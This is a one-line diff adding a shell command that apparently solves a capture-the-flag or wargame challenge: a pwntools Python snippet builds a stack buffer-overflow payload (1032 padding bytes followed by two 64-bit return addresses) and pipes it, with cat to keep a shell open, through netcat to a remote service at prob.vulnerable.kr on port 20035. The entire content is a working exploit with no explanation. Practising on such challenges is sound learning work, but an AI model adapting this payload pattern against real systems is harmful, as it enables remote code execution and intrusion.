@@ -1,0 +1,1 @@
+(python -c 'from pwn import *; print "A"*1032 + p64(0x00400604) + p64(0x00400636)';cat) | nc prob.vulnerable.kr 20035 
